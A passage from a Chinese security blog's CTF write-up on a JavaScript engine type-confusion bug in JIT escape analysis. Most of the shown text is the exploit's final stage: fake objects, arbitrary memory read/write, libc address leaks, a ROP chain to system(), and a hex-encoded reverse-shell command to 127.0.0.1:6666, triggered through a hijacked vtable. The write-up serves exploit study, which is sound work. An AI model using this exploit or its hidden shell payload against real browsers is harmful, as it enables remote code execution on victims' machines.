p64f(0,0x08042ab1);</span><br><span class="line">arr[8] = p64f(0x7ffffffe,0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var arb_fixeddouble_arr = fakeObject(element_addr + 0x2c);</span><br><span class="line"></span><br><span class="line">//leak backing store</span><br><span class="line">backing_store_addr = u64f(arb_fixeddouble_arr[0x9]);</span><br><span class="line">heap_t_addr = u64f(arb_fixeddouble_arr[0xa])</span><br><span class="line">//alert(backing_store_addr.toString(16));</span><br><span class="line">//alert(heap_t_addr.toString(16));</span><br><span class="line">//leak compression ptr high byte</span><br><span class="line">compression_high_bytes = u32f(arb_fixeddouble_arr[0x20]);</span><br><span class="line">//alert(compression_high_bytes.toString(16));</span><br><span class="line"></span><br><span class="line">function addressOf_full(obj) &#123;</span><br><span class="line">   var addr = addressOf(obj);</span><br><span class="line">   return (BigInt(compression_high_bytes) &lt;&lt; 32n) + BigInt(addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">arr = spary[spary_size-0x6];</span><br><span class="line">arr_address = addressOf(arr);</span><br><span class="line">proto_addr = addressOf(ArrayBuffer.prototype);</span><br><span class="line"></span><br><span class="line">//fake a ArrayBuffer Map</span><br><span class="line">arr[0] = p64f(0x08042115,0x140e0e0e);</span><br><span class="line">arr[1] = p64f(0x19000424,0x084003ff);</span><br><span class="line">arr[2] = p64f(proto_addr+1,0);</span><br><span class="line"></span><br><span class="line">element_addr = arr_address + 0x14;</span><br><span class="line">fake_element = element_addr+0x44;</span><br><span class="line"></span><br><span class="line">//fake a ArrayBuffer</span><br><span class="line">arr[4] = p64f(0,element_addr+0x8+0x1);</span><br><span class="line">arr[5] = p64f(0x08042229,0x08042229);</span><br><span class="line">arr[6] = p64f(0xffffffff,0);</span><br><span class="line">arr[7] = p64f(0,0);</span><br><span class="line">arr[9] = p64f(0,2);</span><br><span class="line">var arb_arraybuffer = fakeObject(element_addr + 0x2c);</span><br><span class="line">var adv = new DataView(arb_arraybuffer);</span><br><span class="line"></span><br><span class="line">function read64(addr) &#123;</span><br><span class="line">   arr[7] = i2f64(addr);</span><br><span class="line">   return adv.getBigUint64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function write64(addr,value) &#123;</span><br><span class="line">   arr[7] = i2f64(addr);</span><br><span class="line">   adv.setBigUint64(0,BigInt(value),true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var tmp = read64(heap_t_addr + 0x10n);</span><br><span class="line">var elf_base = read64(tmp) - 0xa76f5c0n;</span><br><span class="line">xchg_rax_rsp = elf_base + 0x872BD7En;</span><br><span class="line">pop_rdi = elf_base + 0xA63BE3Bn;</span><br><span class="line">libc_start_main_got = elf_base + 0x000000000ACA7348n;</span><br><span class="line">var libc_base = read64(libc_start_main_got) - 0x21ab0n;</span><br><span class="line">var system_addr = libc_base + 0x4f4e0n;</span><br><span class="line">//alert(&quot;libc_base=&quot; + libc_base.toString(16));</span><br><span class="line">//</span><br><span class="line">let div = document.createElement(&quot;div&quot;);</span><br><span class="line">let div_addr = addressOf_full(div);</span><br><span class="line">let divobj_addr = read64(div_addr + 20n);</span><br><span class="line"></span><br><span class="line">//rop chain</span><br><span class="line">write64(backing_store_addr+0x1000n+0x50n,xchg_rax_rsp);</span><br><span class="line">write64(backing_store_addr+0x1000n,pop_rdi);</span><br><span class="line">write64(backing_store_addr+0x1000n+0x8n,backing_store_addr+0x1000n+0x100n);</span><br><span class="line">write64(backing_store_addr+0x1000n+0x10n,system_addr);</span><br><span class="line"></span><br><span class="line">//cmd</span><br><span class="line">write64(backing_store_addr+0x1000n+0x100n,0x7361622F6E69622Fn);</span><br><span class="line">write64(backing_store_addr+0x1000n+0x108n,0x20263E20692D2068n);</span><br><span class="line">write64(backing_store_addr+0x1000n+0x110n,0x7063742F7665642Fn);</span><br><span class="line">write64(backing_store_addr+0x1000n+0x118n,0x302E302E3732312Fn);</span><br><span class="line">write64(backing_store_addr+0x1000n+0x120n,0x20363636362F312En);</span><br><span class="line">write64(backing_store_addr+0x1000n+0x128n,0x31263E30n);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//fake vtable ptr</span><br><span class="line">write64(divobj_addr,backing_store_addr+0x1000n);</span><br><span class="line">//alert(&quot;div_addr=&quot;+div_addr.toString(16));</span><br><span class="line">div.dispatchEvent(new Event(&#x27;click&#x27;));</span><br><span class="line"></span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="0x04-感想"><a href="#0x04-感想" class="headerlink" title="0x04 感想"></a>0x04 感想</h2><p>在写这篇文章的过程中，某些疑难点无形中理解了，以后得坚持写文章记录过程。</p>
<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/59215831">JVM之逃逸分析</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/hollis_chuang/article/details/80922794">深入理解Java中的逃逸分析</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/aiqiqi/p/10650394.html">[JVM] 逃逸分析(Escape Analysis）</a><br><a target="_blank" rel="noopener" href="https://www.jfokus.se/jfokus18/preso/Escape-Analysis-in-V8.pdf">Escape Analysis in V8</a><br><a target="_blank" rel="noopener" href="https://yichenchai.github.io/blog/omnitmizer">Pwn2Win OmniTmizer</a></p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/JS%E5%BC%95%E6%93%8E%E6%BC%8F%E6%B4%9E/" rel="tag"># JS引擎漏洞</a>
              <a href="/tags/%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/" rel="tag"># 类型混淆</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2020/11/23/qwb2020-final-PiAno/" rel="prev" title="强网杯2020决赛RealWord的IE浏览器漏洞挖掘——PiAno(PA)">
      <i class="fa fa-chevron-left"></i> 强网杯2020决赛RealWord的IE浏览器漏洞挖掘——PiAno(PA)
    </a></div>
      <div class="post-nav-item">
    <a href="/2020/12/06/roarctf2020-qtar/" rel="next" title="roarctf2020_qtar">
      roarctf2020_qtar <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">2.</span> <span class="nav-text">0x01 前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%83%E9%80%B8%E5%88%86%E6%9E%90"><span class="nav-number">2.1.</span> <span class="nav-text">逃逸分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A6%82%E5%BF%B5"><span class="nav-number">2.1.1.</span> <span class="nav-text">概念</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BC%98%E5%8C%96%E6%9C%AA%E9%80%83%E9%80%B8%E7%9A%84%E5%AF%B9%E8%B1%A1"><span class="nav-number">2.1.2.</span> <span class="nav-text">优化未逃逸的对象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E4%B8%80%E4%B8%AA%E9%80%83%E9%80%B8"><span class="nav-number">2.1.3.</span> <span class="nav-text">构造一个逃逸</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JIT%E9%80%83%E9%80%B8%E5%88%86%E6%9E%90%E5%A6%82%E4%BD%95%E7%A1%AE%E5%AE%9A%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B"><span class="nav-number">2.1.4.</span> <span class="nav-text">JIT逃逸分析如何确定变量类型</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">0x02 漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#patch%E5%88%86%E6%9E%90"><span class="nav-number">3.1.</span> <span class="nav-text">patch分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90"><span class="nav-number">3.2.</span> <span class="nav-text">POC构造与分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">0x03 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E6%84%9F%E6%83%B3"><span class="nav-number">5.</span> <span class="nav-text">0x04 感想</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%8F%82%E8%80%83"><span class="nav-number">6.</span> <span class="nav-text">0x05 参考</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">ha1vk</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">233</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">145</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ha1vk</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>


        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
